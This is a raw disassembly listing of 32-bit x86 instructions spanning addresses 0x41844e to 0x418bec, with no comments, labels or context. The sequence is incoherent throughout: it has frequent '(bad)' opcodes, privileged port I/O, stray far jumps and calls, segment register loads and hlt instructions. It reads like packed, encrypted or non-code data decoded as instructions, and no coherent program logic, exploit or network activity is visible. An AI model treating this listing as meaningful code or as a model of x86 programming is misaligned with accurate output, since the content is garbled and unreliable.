  41844e:	inc    edi
  41844f:	lods   al,BYTE PTR ds:[esi]
  418450:	mov    ch,0xe9
  418452:	pop    ds
  418453:	(bad)  
  418454:	mov    eax,0x7e830771
  418459:	adc    eax,0xb344441e
  41845e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41845f:	fs das 
  418461:	xor    DWORD PTR [ecx+0x23],0x8b6a9f2a
  418468:	mov    eax,ds:0xfd65880d
  41846d:	dec    edi
  41846e:	mul    BYTE PTR [eax+0x71]
  418471:	fucom  st(2)
  418473:	lahf   
  418474:	or     bh,ch
  418476:	pop    es
  418477:	in     al,dx
  418478:	repz sbb DWORD PTR [ebp+0x39],esp
  41847c:	or     esi,DWORD PTR [ecx]
  41847e:	imul   esi,DWORD PTR ds:0x7255aea5,0x1a
  418485:	xchg   ecx,eax
  418486:	push   ss
  418487:	test   eax,0xc423977e
  41848c:	sar    BYTE PTR [esi-0x6e],0xe8
  418490:	inc    ebx
  418491:	sbb    eax,DWORD PTR [ebp+eiz*2-0x79ab4195]
  418498:	ja     0x41848b
  41849a:	daa    
  41849b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41849c:	pop    ecx
  41849d:	push   0xfffffff5
  41849f:	dec    edi
  4184a0:	cmp    BYTE PTR [esi],ch
  4184a2:	scas   eax,DWORD PTR es:[edi]
  4184a3:	ficomp DWORD PTR ss:[ecx-0x68]
  4184a7:	ja     0x418462
  4184a9:	adc    DWORD PTR [edi+0x6e69f04a],ebx
  4184af:	imul   esi,esp,0x28334e0
  4184b5:	fst    st(5)
  4184b7:	in     al,0xd2
  4184b9:	inc    ecx
  4184ba:	inc    esp
  4184bb:	pop    ss
  4184bc:	scas   eax,DWORD PTR es:[edi]
  4184bd:	add    ebx,DWORD PTR [edi+ebx*8+0x35328258]
  4184c4:	mov    ds:0xa771e802,al
  4184c9:	fldcw  WORD PTR [ebx+0x1]
  4184cc:	loop   0x418529
  4184ce:	push   edx
  4184cf:	mov    ebp,0xbbde2a29
  4184d4:	dec    BYTE PTR [edi]
  4184d6:	ss mov ebp,0x66156733
  4184dc:	rol    DWORD PTR [edx],0x8d
  4184df:	aas    
  4184e0:	jnp    0x418471
  4184e2:	aas    
  4184e3:	and    edi,ecx
  4184e5:	cmp    eax,0x1d7eb6a0
  4184ea:	xor    BYTE PTR [edi-0x4d3a1b5],bl
  4184f0:	lea    ebp,[ebp+edx*8+0x2]
  4184f4:	xchg   ecx,eax
  4184f5:	aas    
  4184f6:	fistp  DWORD PTR [ecx+0x6bfd0c9b]
  4184fc:	aad    0x3f
  4184fe:	lods   al,BYTE PTR ds:[esi]
  4184ff:	or     al,0x4d
  418501:	into   
  418502:	push   ss
  418503:	test   DWORD PTR [eax+0x50],ebx
  418506:	adc    dh,0x8e
  418509:	in     al,0x5d
  41850b:	pushf  
  41850c:	push   esp
  41850d:	jbe    0x4184a2
  41850f:	test   al,0x62
  418511:	arpl   bx,bx
  418513:	jns    0x4184ab
  418515:	lock cmp esp,DWORD PTR [eax-0x4c646b0f]
  41851c:	mov    WORD PTR [ebp-0x69b018b9],es
  418522:	cmp    ch,BYTE PTR [eax-0x2e18f3aa]
  418528:	push   ebx
  418529:	aad    0xf2
  41852b:	cmp    eax,0x39b45834
  418530:	ins    BYTE PTR es:[edi],dx
  418531:	sub    al,0x99
  418533:	loope  0x418583
  418535:	push   es
  418536:	shl    edx,1
  418538:	mov    cl,0x71
  41853a:	mov    fs,WORD PTR [ecx-0x38]
  41853d:	test   DWORD PTR [si-0x7f8],esi
  418542:	mov    ebp,0x51f691b8
  418547:	dec    ecx
  418548:	adc    dl,BYTE PTR [ebx+0x5e]
  41854b:	pushf  
  41854c:	xchg   ebp,eax
  41854d:	add    ah,BYTE PTR [esi]
  41854f:	inc    ecx
  418550:	add    DWORD PTR [ebp-0x2ebdaf12],esp
  418556:	xchg   BYTE PTR [edi-0x2],ah
  418559:	xchg   esp,eax
  41855a:	cmp    DWORD PTR [edx],esi
  41855c:	push   es
  41855d:	mov    ds:0xd2ec13a0,al
  418562:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  418564:	das    
  418565:	int3   
  418566:	cld    
  418567:	add    DWORD PTR [edi-0x653f3de7],eax
  41856d:	jnp    0x41856c
  41856f:	dec    ebx
  418570:	sbb    eax,0x5d14bcf3
  418575:	jno    0x418529
  418577:	clc    
  418578:	je     0x4185f9
  41857a:	inc    edx
  41857b:	sub    eax,0xec5da237
  418580:	in     al,dx
  418581:	or     ch,BYTE PTR [ecx+0x334d59d3]
  418587:	dec    edi
  418588:	cld    
  418589:	iret   
  41858a:	das    
  41858b:	cmp    al,0x8f
  41858d:	fnstsw WORD PTR [esi]
  41858f:	loope  0x4185d6
  418591:	stos   BYTE PTR es:[edi],al
  418592:	pop    esi
  418593:	sub    BYTE PTR [eax],0x59
  418596:	test   al,0x36
  418598:	jecxz  0x418609
  41859a:	ins    DWORD PTR es:[edi],dx
  41859b:	sub    bh,bl
  41859d:	mov    ebp,0x1ec1b463
  4185a2:	inc    si
  4185a4:	add    al,0x5b
  4185a6:	mov    al,0xb9
  4185a8:	sub    DWORD PTR [ecx+0x7a24db46],0x6483c36d
  4185b2:	sbb    eax,0xfa8c3244
  4185b7:	jns    0x41858f
  4185b9:	mov    al,BYTE PTR [edx+edi*1-0x5a56f6d9]
  4185c0:	sub    edi,DWORD PTR [ebp+0x5d20f1b2]
  4185c6:	or     edx,edi
  4185c8:	cmp    edi,ebx
  4185ca:	xchg   BYTE PTR [esi+0x4c36e940],bl
  4185d0:	xchg   DWORD PTR [esi],esp
  4185d2:	bound  ebp,QWORD PTR [eax-0x39]
  4185d5:	js     0x41860b
  4185d7:	push   0xe2e3b873
  4185dc:	test   al,0x83
  4185de:	mov    ss,WORD PTR [eax]
  4185e0:	and    ebp,edi
  4185e2:	cmp    DWORD PTR [eax],ebx
  4185e4:	jae    0x4185f4
  4185e6:	mov    DWORD PTR [edx],edi
  4185e8:	push   cs
  4185e9:	nop
  4185ea:	push   edx
  4185eb:	add    eax,0x42f5a023
  4185f0:	outs   dx,DWORD PTR ds:[esi]
  4185f1:	popf   
  4185f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4185f3:	fld    QWORD PTR [esi-0x8e2987f]
  4185f9:	xchg   eax,ecx
  4185fb:	adc    esi,DWORD PTR [edi-0x44]
  4185fe:	je     0x4185ce
  418600:	das    
  418601:	mov    esp,0x7e882fa9
  418606:	test   BYTE PTR [ebx-0x2b],0x29
  41860a:	or     ah,ch
  41860c:	jmp    0x4185e4
  41860e:	push   es
  41860f:	sbb    DWORD PTR [ebx],0x8b0a8c70
  418615:	mov    bh,0xce
  418617:	dec    esi
  418618:	pusha  
  418619:	iret   
  41861a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41861b:	aad    0x6
  41861d:	sub    dl,ch
  41861f:	xchg   edi,eax
  418620:	jmp    0x3dd6:0xa666d3c4
  418627:	xor    DWORD PTR [edi-0x2],esi
  41862a:	stos   BYTE PTR es:[edi],al
  41862b:	div    edx
  41862d:	inc    edx
  41862e:	hlt    
  41862f:	adc    DWORD PTR [eax+edx*2],edi
  418632:	rol    ch,1
  418634:	aam    0xd3
  418636:	shr    BYTE PTR [eax+0x69],0x9e
  41863a:	dec    edx
  41863b:	xor    eax,0x6eec839
  418640:	push   edi
  418641:	dec    edi
  418642:	xlat   BYTE PTR ds:[ebx]
  418643:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418644:	dec    ebx
  418645:	fs clc 
  418647:	imul   BYTE PTR [ebx-0x13b10aa8]
  41864d:	mov    WORD PTR [edi-0x40],cs
  418650:	enter  0x58fe,0xa1
  418654:	mov    ds:0xee509e9a,eax
  418659:	hlt    
  41865a:	repz inc esp
  41865c:	mov    eax,0xb65c7e87
  418661:	iret   
  418662:	mov    al,ds:0xd8084f0e
  418667:	jnp    0x418627
  418669:	mov    al,0xb9
  41866b:	fisttp QWORD PTR [ecx+0x6342be4b]
  418671:	test   BYTE PTR [ecx],0x8f
  418674:	jecxz  0x41868a
  418676:	mov    eax,DWORD PTR ds:0xb4046ae2
  41867c:	ret    
  41867d:	fist   WORD PTR ds:[ebx+0x3d04328c]
  418684:	or     al,0x86
  418686:	int    0xe1
  418688:	dec    ecx
  418689:	mov    esp,0x5a52f155
  41868e:	cmp    DWORD PTR es:[esi+eax*1],eax
  418692:	loope  0x4186ae
  418694:	add    BYTE PTR [edx],bl
  418696:	mov    ah,0xfa
  418698:	pop    ebp
  418699:	cmp    eax,0xa8907d89
  41869e:	xor    al,0x8e
  4186a0:	arpl   WORD PTR [esi],sp
  4186a2:	outs   dx,DWORD PTR ds:[esi]
  4186a3:	sti    
  4186a4:	xchg   ebx,eax
  4186a5:	mov    esp,0xe1d9db43
  4186aa:	repnz mov esp,0x2db43173
  4186b0:	out    dx,al
  4186b1:	jmp    0xd9793871
  4186b6:	pusha  
  4186b7:	rcl    DWORD PTR [eax+0x40a4f2a3],cl
  4186bd:	cmp    DWORD PTR [eax-0x7e],edi
  4186c0:	int3   
  4186c1:	outs   dx,BYTE PTR ds:[esi]
  4186c2:	mov    esi,DWORD PTR [edx]
  4186c4:	push   0x72
  4186c6:	mov    eax,ds:0x64fd68b
  4186cb:	pop    edi
  4186cc:	inc    esp
  4186cd:	jbe    0x418680
  4186cf:	cmp    al,0x7b
  4186d1:	xchg   esp,eax
  4186d2:	sahf   
  4186d3:	popa   
  4186d4:	pop    ebp
  4186d5:	pop    ecx
  4186d6:	xchg   ebx,eax
  4186d7:	xor    al,0x1e
  4186d9:	ins    BYTE PTR es:[edi],dx
  4186da:	push   cs
  4186db:	das    
  4186dc:	not    DWORD PTR [ebp-0x3f]
  4186df:	jnp    0x418749
  4186e1:	aam    0x91
  4186e3:	mov    ch,0x83
  4186e5:	inc    ecx
  4186e6:	xor    BYTE PTR [ecx+0x10e10336],dh
  4186ec:	jbe    0x41873e
  4186ee:	pop    esi
  4186ef:	rcl    bh,0xee
  4186f2:	or     al,0xfa
  4186f4:	xchg   esi,eax
  4186f5:	hlt    
  4186f6:	push   0x7d63e3b
  4186fb:	inc    ecx
  4186fc:	push   esp
  4186fd:	mov    ah,0x55
  4186ff:	ja     0x41872e
  418701:	or     eax,0xbd352b34
  418706:	sbb    al,0xf4
  418708:	test   eax,0x5c794f3d
  41870d:	xor    bh,BYTE PTR [ecx]
  41870f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418710:	repnz not cl
  418713:	adc    edx,DWORD PTR ss:[ebx+0x37c92b30]
  41871a:	mov    bh,0x13
  41871c:	mov    esi,0x10e798a4
  418721:	xchg   edi,eax
  418722:	outs   dx,DWORD PTR ds:[esi]
  418723:	test   DWORD PTR [edx+0x2e96b2e8],0xaab44577
  41872d:	aaa    
  41872e:	jnp    0x4186d0
  418730:	das    
  418731:	js     0x41872c
  418733:	mov    al,ds:0x9524d085
  418738:	add    ebx,DWORD PTR [esi+ebp*4-0x4b]
  41873c:	sub    eax,DWORD PTR [ecx]
  41873e:	lock xchg edi,eax
  418740:	inc    ebp
  418741:	mov    dl,0x2c
  418743:	sub    eax,0x980fac10
  418748:	inc    eax
  418749:	aam    0x42
  41874b:	add    BYTE PTR [ecx+0x5a],0x20
  41874f:	dec    ebx
  418750:	ins    DWORD PTR es:[edi],dx
  418751:	inc    eax
  418752:	mov    ss,edx
  418754:	out    0xe0,eax
  418756:	mov    DWORD PTR [ebp+0x1c],ecx
  418759:	out    0x90,eax
  41875b:	std    
  41875c:	hlt    
  41875d:	mov    ebp,0xc993a359
  418762:	stc    
  418763:	mov    ds:0x16165f69,al
  418768:	dec    edi
  418769:	mov    bh,0x5c
  41876b:	add    dl,0xfa
  41876e:	adc    DWORD PTR [esi+0x9],edi
  418771:	xlat   BYTE PTR ds:[ebx]
  418772:	sub    bl,BYTE PTR [ebx+0x7f]
  418775:	inc    edi
  418776:	inc    ebx
  418777:	xchg   ebp,eax
  418778:	mov    al,ds:0xb566940e
  41877d:	fdivr  QWORD PTR [ebp-0x1e]
  418780:	rcr    DWORD PTR [ebx+edi*8+0x4a],cl
  418784:	jns    0x41876e
  418786:	mov    ebx,0xfddc602b
  41878b:	or     al,0x3a
  41878d:	lock jbe 0x4187f7
  418790:	aas    
  418791:	inc    eax
  418792:	dec    edx
  418793:	in     al,dx
  418794:	add    al,0x10
  418796:	ret    0x33b9
  418799:	lahf   
  41879a:	jae    0x418722
  41879c:	adc    eax,0xb086de
  4187a1:	fidivr DWORD PTR [eax+0x64]
  4187a4:	retf   0xdd35
  4187a7:	push   ds
  4187a8:	gs mov ecx,0x625cf1c0
  4187ae:	add    al,0xd3
  4187b0:	in     al,dx
  4187b1:	std    
  4187b2:	(bad)  
  4187b3:	mov    edx,0x36ff59a5
  4187b8:	push   eax
  4187b9:	jg     0x4187e8
  4187bb:	and    BYTE PTR [ebx+0x3d],0x18
  4187bf:	retf   
  4187c0:	popf   
  4187c1:	dec    esi
  4187c2:	mov    bh,BYTE PTR [ebp-0x3bd00bb5]
  4187c8:	in     al,dx
  4187c9:	sbb    ch,BYTE PTR [edi]
  4187cb:	leave  
  4187cc:	outs   dx,DWORD PTR ds:[esi]
  4187cd:	aaa    
  4187ce:	loopne 0x41881c
  4187d0:	adc    dl,BYTE PTR [eax]
  4187d2:	outs   dx,BYTE PTR cs:[esi]
  4187d4:	shl    BYTE PTR cs:[edx+eax*8+0x12],cl
  4187d9:	hlt    
  4187da:	and    cl,bh
  4187dc:	jecxz  0x4187a1
  4187de:	and    BYTE PTR [edx-0x41],cl
  4187e1:	push   ds
  4187e2:	cld    
  4187e3:	pushf  
  4187e4:	inc    eax
  4187e5:	pop    ebp
  4187e6:	daa    
  4187e7:	cmc    
  4187e8:	push   esi
  4187e9:	jbe    0x4187af
  4187eb:	out    0xce,al
  4187ed:	sub    DWORD PTR [eax+0x6],ecx
  4187f0:	scas   al,BYTE PTR es:[edi]
  4187f1:	call   0xe9ef:0xd3d0e655
  4187f8:	xchg   ecx,eax
  4187f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187fa:	jo     0x41887b
  4187fc:	mov    dl,0x98
  4187fe:	sahf   
  4187ff:	test   al,0x57
  418801:	fisttp QWORD PTR [ecx*1-0x303e3a4]
  418808:	xor    DWORD PTR [esp+ebp*2+0x48],esi
  41880c:	sub    BYTE PTR fs:[ebx+0x2438abf4],dh
  418813:	xlat   BYTE PTR ds:[ebx]
  418814:	pushf  
  418815:	push   0x6a
  418817:	retf   
  418818:	cmp    eax,0x336b2814
  41881d:	stc    
  41881e:	pushf  
  41881f:	xchg   ebx,esp
  418821:	pushf  
  418822:	xor    DWORD PTR [ebp-0x963ee76],ebp
  418828:	xchg   ecx,eax
  418829:	(bad)  
  41882a:	or     esp,DWORD PTR [esp+ebx*4]
  41882d:	dec    esp
  41882e:	retf   
  41882f:	sub    BYTE PTR [edx],cl
  418831:	bound  edx,QWORD PTR [ebp+0x4c]
  418834:	adc    BYTE PTR [ebx+0xd],bh
  418837:	cmp    BYTE PTR ds:[ebx],ch
  41883a:	pop    edi
  41883b:	(bad)  
  41883d:	fmul   QWORD PTR [ebp+0x6862314e]
  418843:	shr    DWORD PTR [ecx-0x216794d2],0x7a
  41884a:	xor    edx,ebx
  41884c:	jns    0x4188b5
  41884e:	std    
  41884f:	jp     0x41881f
  418851:	sbb    ch,dl
  418853:	pop    ebx
  418854:	push   ds
  418855:	popf   
  418856:	leave  
  418857:	xor    eax,0x358e63f1
  41885c:	clc    
  41885d:	fldenv [ebx]
  41885f:	inc    ebp
  418860:	scas   eax,DWORD PTR es:[edi]
  418861:	push   ecx
  418862:	test   BYTE PTR [esi-0x55a2278f],0xee
  418869:	js     0xdfdf9230
  41886f:	push   esi
  418870:	mov    al,0x4d
  418872:	xor    BYTE PTR [esi-0x7c],dl
  418875:	xor    bl,BYTE PTR [edi]
  418877:	dec    eax
  418878:	out    dx,eax
  418879:	sub    DWORD PTR [ecx],eax
  41887b:	cld    
  41887c:	std    
  41887d:	adc    edi,DWORD PTR ds:[edx+ecx*4]
  418881:	or     ah,ah
  418883:	sbb    eax,0x1944ba3a
  418888:	dec    ecx
  418889:	bound  ebx,QWORD PTR [ebp-0x41803027]
  41888f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418890:	clc    
  418891:	push   ss
  418892:	sub    eax,0xfd6f8b37
  418897:	adc    edi,DWORD PTR [edx]
  418899:	(bad)  
  41889a:	aad    0xd5
  41889c:	rol    BYTE PTR [ebx+eax*8-0x73],1
  4188a0:	adc    ebp,DWORD PTR [ebx-0x1e]
  4188a3:	repnz (bad) 
  4188a5:	shl    DWORD PTR [eax+eiz*2],cl
  4188a8:	(bad)  
  4188a9:	sub    eax,0xf5820e6
  4188ae:	popf   
  4188af:	jl     0x4188d9
  4188b1:	(bad)  [ecx+0x52]
  4188b4:	fs call 0xa402556f
  4188ba:	xchg   DWORD PTR [esi-0xb],ebx
  4188bd:	sbb    BYTE PTR [edi],bl
  4188bf:	mov    bl,0x2d
  4188c1:	arpl   ax,si
  4188c3:	out    0xf8,al
  4188c5:	pop    ss
  4188c6:	jae    0x418863
  4188c8:	adc    BYTE PTR [esi],al
  4188ca:	(bad)  
  4188cb:	ds not edi
  4188ce:	xchg   edx,eax
  4188cf:	pop    edi
  4188d0:	std    
  4188d1:	cmp    esi,DWORD PTR [eax+ebp*2]
  4188d4:	aam    0x35
  4188d6:	sub    eax,0x83095555
  4188db:	mov    WORD PTR [edi],gs
  4188dd:	ss fwait
  4188df:	idiv   DWORD PTR ds:0x421a0a9a
  4188e5:	fadd   st(2),st
  4188e7:	sub    al,0x36
  4188e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4188ea:	imul   ebx,DWORD PTR [ecx+0x46f5fd2c],0xab109ba
  4188f4:	retf   0xd5c3
  4188f7:	dec    ebp
  4188f8:	xchg   ebx,eax
  4188f9:	js     0x418935
  4188fb:	cmp    al,0x39
  4188fd:	leave  
  4188fe:	push   0xd90c61c2
  418903:	cdq    
  418904:	jns    0x418957
  418906:	inc    edx
  418907:	sub    ecx,DWORD PTR ds:0x305176be
  41890d:	rcr    DWORD PTR [esi-0x6c],1
  418910:	cmp    al,dh
  418912:	int    0x11
  418914:	and    DWORD PTR [eax-0x63],ebp
  418917:	ss jnp 0x418922
  41891a:	pop    es
  41891b:	xor    ah,BYTE PTR ss:[eax-0x62]
  41891f:	dec    ecx
  418920:	push   ss
  418921:	pop    es
  418922:	dec    ecx
  418923:	fadd   DWORD PTR [esi-0x7d]
  418926:	retf   
  418927:	cmc    
  418928:	in     eax,0x9f
  41892a:	cwde   
  41892b:	mov    esp,0x27df136c
  418930:	out    dx,al
  418931:	jae    0x418904
  418933:	aaa    
  418934:	add    al,0x1f
  418936:	sbb    al,0xb
  418938:	pop    ss
  418939:	jecxz  0x418956
  41893b:	rcr    DWORD PTR [edi],1
  41893d:	jle    0x418926
  41893f:	mov    bh,ch
  418941:	aad    0xed
  418943:	mov    edx,0xed2a90f8
  418948:	and    esi,esp
  41894a:	lods   eax,DWORD PTR ds:[esi]
  41894b:	sbb    BYTE PTR [ecx+0x69],bh
  41894e:	test   BYTE PTR [esi],ah
  418950:	daa    
  418951:	arpl   WORD PTR [ebx],si
  418953:	adc    esp,edi
  418955:	ret    0x387e
  418958:	or     BYTE PTR [edx-0x5f],ch
  41895b:	jg     0x4189b7
  41895d:	mov    al,ds:0xe32f52de
  418962:	inc    edi
  418963:	and    bl,BYTE PTR [ecx-0x7aace0a7]
  418969:	(bad)  
  41896a:	and    ebp,DWORD PTR [ebx]
  41896c:	jmp    0xcb21fba7
  418971:	jge    0x418959
  418973:	hlt    
  418974:	test   al,0x43
  418976:	dec    ecx
  418977:	mov    BYTE PTR [ebx-0x13],ch
  41897a:	dec    ebp
  41897b:	ins    BYTE PTR es:[edi],dx
  41897c:	shl    DWORD PTR [edi-0x4b9fd6d6],1
  418982:	test   al,0xf6
  418984:	or     ebp,DWORD PTR [edx]
  418986:	test   BYTE PTR [ecx-0x12f8e225],bh
  41898c:	(bad)  
  41898d:	or     ebp,DWORD PTR [ecx-0x2c]
  418990:	adc    esi,DWORD PTR [eax+ecx*4-0x6b4bbe6b]
  418997:	test   al,0xe1
  418999:	push   es
  41899a:	pusha  
  41899b:	mov    DWORD PTR [edi-0x197ac05b],edx
  4189a1:	cmp    dh,dl
  4189a3:	add    al,0x39
  4189a5:	dec    esp
  4189a6:	bound  ebp,QWORD PTR ds:0x831d4ab3
  4189ac:	test   eax,0x6c4aa0e
  4189b1:	stos   BYTE PTR es:[edi],al
  4189b2:	push   edx
  4189b3:	xor    ah,BYTE PTR [edi+0x6c]
  4189b6:	aad    0xf0
  4189b8:	std    
  4189b9:	pop    esi
  4189ba:	dec    eax
  4189bb:	mov    edx,0xaa842316
  4189c0:	out    dx,eax
  4189c1:	repnz inc esi
  4189c3:	add    ebx,DWORD PTR [ecx+ebx*8]
  4189c6:	iret   
  4189c7:	sbb    bh,BYTE PTR [edi-0x47946d82]
  4189cd:	mov    ebp,0xd5407905
  4189d2:	lea    edi,[ebp-0x11f7efa3]
  4189d8:	push   edx
  4189d9:	hlt    
  4189da:	pop    esi
  4189db:	xacquire xchg DWORD PTR [ebx+0x6c2c8583],eax
  4189e2:	sar    BYTE PTR [edx+0x407bd00c],cl
  4189e8:	cs or  eax,0xdcf68977
  4189ee:	mov    ds,esp
  4189f0:	adc    bl,BYTE PTR [ebx-0x7e126c50]
  4189f6:	(bad)  
  4189f8:	mov    dh,ah
  4189fa:	jg     0x418a27
  4189fc:	aad    0x18
  4189fe:	push   esi
  4189ff:	loop   0x418a21
  418a01:	push   esp
  418a02:	xor    esp,DWORD PTR [esi+0x6dcc3969]
  418a08:	aas    
  418a09:	jbe    0x418a4a
  418a0b:	pop    ebx
  418a0c:	cmp    dl,BYTE PTR [edx-0x1]
  418a0f:	and    al,0x9c
  418a11:	mov    eax,ds:0xecd617fc
  418a16:	outs   dx,DWORD PTR ds:[esi]
  418a17:	mov    WORD PTR [edx+0x2b9edf37],ss
  418a1d:	push   0x6c39c2de
  418a22:	add    BYTE PTR [esi-0x53],ch
  418a25:	not    BYTE PTR [esi-0xd]
  418a28:	cld    
  418a29:	sbb    BYTE PTR [esi+0x4],bl
  418a2c:	cs cmp DWORD PTR ds:[esi-0xc],eax
  418a31:	cwde   
  418a32:	(bad)  
  418a33:	int3   
  418a34:	(bad)  
  418a35:	push   edi
  418a36:	test   BYTE PTR [esi+0x230847d5],0xc
  418a3d:	dec    esp
  418a3e:	jp     0x418a34
  418a40:	xchg   edx,eax
  418a41:	mov    dl,0xef
  418a43:	xchg   edx,eax
  418a44:	dec    edi
  418a45:	pop    esi
  418a46:	mov    eax,ds:0x7d364244
  418a4b:	sbb    DWORD PTR [eax-0x76],ebx
  418a4e:	cli    
  418a4f:	lock xchg ebp,eax
  418a51:	mov    edi,0x4ed55297
  418a56:	int3   
  418a57:	sbb    DWORD PTR [edi],esp
  418a59:	daa    
  418a5a:	test   BYTE PTR [ebx],cl
  418a5c:	add    DWORD PTR [ebx-0x4],esi
  418a5f:	pop    ss
  418a60:	dec    esi
  418a61:	add    DWORD PTR [edx-0x67],esi
  418a64:	push   esp
  418a65:	shl    DWORD PTR [ecx+0x63],0x34
  418a69:	mov    esp,0x318e89a9
  418a6e:	or     eax,0x6d39cd69
  418a73:	push   cs
  418a74:	mov    bh,BYTE PTR [eax+0x497575b3]
  418a7a:	push   esp
  418a7b:	nop
  418a7c:	cmp    DWORD PTR [eax],0xa5099c12
  418a82:	pop    ebx
  418a83:	retf   
  418a84:	inc    ebx
  418a85:	pop    eax
  418a86:	adc    bl,ah
  418a88:	or     eax,0x9f2e8a4b
  418a8d:	int    0xe
  418a8f:	rol    DWORD PTR [edi+ebp*8-0x42e20a59],cl
  418a96:	push   es
  418a97:	sbb    al,0xb4
  418a99:	pop    ss
  418a9a:	ins    BYTE PTR es:[edi],dx
  418a9b:	adc    DWORD PTR [ebx],0x15b7baf7
  418aa1:	in     eax,0x71
  418aa3:	loope  0x418ae2
  418aa5:	cli    
  418aa6:	xchg   ecx,eax
  418aa7:	int3   
  418aa8:	push   edx
  418aa9:	pop    es
  418aaa:	mov    ch,0x64
  418aac:	jecxz  0x418a86
  418aae:	push   ss
  418aaf:	xor    BYTE PTR [edx+ecx*4-0x7be64ff7],bh
  418ab6:	cwde   
  418ab7:	imul   ebp,DWORD PTR [ebx+eax*4-0x11],0xa20675c9
  418abf:	adc    bh,BYTE PTR [ebx-0x1c]
  418ac2:	nop
  418ac3:	pop    ss
  418ac4:	mov    WORD PTR [ebx+ebp*2],ds
  418ac7:	ficomp WORD PTR [eax-0x1d450d00]
  418acd:	or     BYTE PTR [esi-0x2bedfc49],dl
  418ad3:	xor    ch,dh
  418ad5:	out    0x7c,al
  418ad7:	sub    DWORD PTR [ebx-0x78],edx
  418ada:	dec    edx
  418adb:	les    edx,FWORD PTR [edi]
  418add:	mov    al,ds:0xb8b5fdb6
  418ae2:	aaa    
  418ae3:	cld    
  418ae4:	push   ss
  418ae5:	add    BYTE PTR ds:0x915ee685,0x7a
  418aec:	push   eax
  418aed:	dec    esi
  418aee:	pop    esi
  418aef:	jns    0x418b59
  418af1:	pop    esi
  418af2:	inc    ebx
  418af3:	idiv   BYTE PTR [ebx]
  418af5:	xchg   ebp,eax
  418af6:	nop
  418af7:	xor    bl,BYTE PTR [edx+0x2e7d6caa]
  418afd:	mov    ebx,es
  418aff:	xchg   esi,eax
  418b00:	ja     0x418b4d
  418b02:	adc    al,0xf6
  418b04:	mov    ecx,0xc98eed4f
  418b09:	icebp  
  418b0a:	inc    eax
  418b0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b0c:	dec    edx
  418b0d:	add    BYTE PTR [esi-0x776a3ac1],bh
  418b13:	push   cs
  418b14:	ins    BYTE PTR es:[edi],dx
  418b15:	stc    
  418b16:	add    edx,DWORD PTR [ebx]
  418b18:	and    esi,DWORD PTR [edi+esi*1-0x47c7578c]
  418b1f:	pop    ss
  418b20:	scas   eax,DWORD PTR es:[edi]
  418b21:	xchg   edi,eax
  418b22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b23:	and    BYTE PTR [ebx],0x1d
  418b26:	push   esi
  418b27:	adc    eax,0x47a8d178
  418b2c:	fidiv  DWORD PTR ds:0xaaf9f9c7
  418b32:	out    0xe4,eax
  418b34:	jge    0x418ab8
  418b36:	stos   BYTE PTR es:[edi],al
  418b37:	neg    BYTE PTR [ebx]
  418b39:	sub    eax,0xe72452ab
  418b3e:	adc    al,0x3b
  418b40:	icebp  
  418b41:	test   al,0xa9
  418b43:	loopne 0x418b9b
  418b45:	mov    edi,DWORD PTR [ebp+eax*1+0x3f9181ea]
  418b4c:	adc    eax,0x93d62b7e
  418b51:	fsub   st(5),st
  418b53:	pop    ebx
  418b54:	sub    al,0xb2
  418b56:	loope  0x418b2b
  418b58:	inc    ecx
  418b59:	ins    DWORD PTR es:[edi],dx
  418b5a:	inc    ebx
  418b5b:	popf   
  418b5c:	ins    BYTE PTR es:[edi],dx
  418b5d:	inc    ecx
  418b5e:	aam    0xf4
  418b60:	push   ds
  418b61:	jnp    0x418be2
  418b63:	shl    DWORD PTR [ebp-0x6795158b],cl
  418b69:	popa   
  418b6a:	daa    
  418b6b:	sbb    eax,0xb7937aae
  418b70:	outs   dx,BYTE PTR ds:[esi]
  418b71:	add    BYTE PTR [ebx],dl
  418b73:	std    
  418b74:	stos   BYTE PTR es:[edi],al
  418b75:	hlt    
  418b76:	(bad)  
  418b77:	jg     0x418ba0
  418b79:	call   0x65e3b8b7
  418b7e:	pop    ebp
  418b7f:	cmp    eax,0x63
  418b82:	jmp    0xe9b65383
  418b87:	pop    ebx
  418b88:	push   0xacb72d62
  418b8d:	and    eax,0x8301f29f
  418b92:	sahf   
  418b93:	jnp    0x418b81
  418b95:	pop    ebp
  418b96:	mov    dh,0x65
  418b98:	in     eax,dx
  418b99:	push   0xe2f2c3d6
  418b9e:	push   edx
  418b9f:	jnp    0x418b50
  418ba1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ba2:	push   ss
  418ba3:	cwde   
  418ba4:	scas   eax,DWORD PTR es:[edi]
  418ba5:	rol    BYTE PTR [ecx],1
  418ba7:	lds    esi,FWORD PTR [edx+0x77]
  418baa:	push   ecx
  418bab:	rcr    DWORD PTR [edx],1
  418bad:	pop    esp
  418bae:	in     eax,dx
  418baf:	cmp    al,BYTE PTR [ebp+0x52]
  418bb2:	xchg   edi,eax
  418bb3:	das    
  418bb4:	stos   DWORD PTR es:[edi],eax
  418bb5:	xchg   edi,eax
  418bb6:	lgs    ebx,FWORD PTR [eax]
  418bb9:	mov    ebx,0x1482628b
  418bbe:	ds xchg ebp,eax
  418bc0:	daa    
  418bc1:	sti    
  418bc2:	stc    
  418bc3:	(bad)  
  418bc4:	fidivr WORD PTR [ebx-0x12]
  418bc7:	sub    BYTE PTR [edx-0x2d],dl
  418bca:	mov    esi,DWORD PTR [eax]
  418bcc:	sub    eax,0x7e1a3d20
  418bd1:	cmp    ah,BYTE PTR [esi+0x45b40673]
  418bd7:	rcr    DWORD PTR ds:[esi],cl
  418bda:	jnp    0x418b99
  418bdc:	rol    al,0xdf
  418bdf:	dec    eax
  418be0:	push   edx
  418be1:	push   ebp
  418be2:	jb     0x418c1a
  418be4:	pop    edx
  418be5:	xchg   ecx,eax
  418be6:	addr16 pop ecx
  418be8:	std    
  418be9:	icebp  
  418bea:	cmp    DWORD PTR [ecx],edx
  418bec:	jmp    0xa6f5fda4
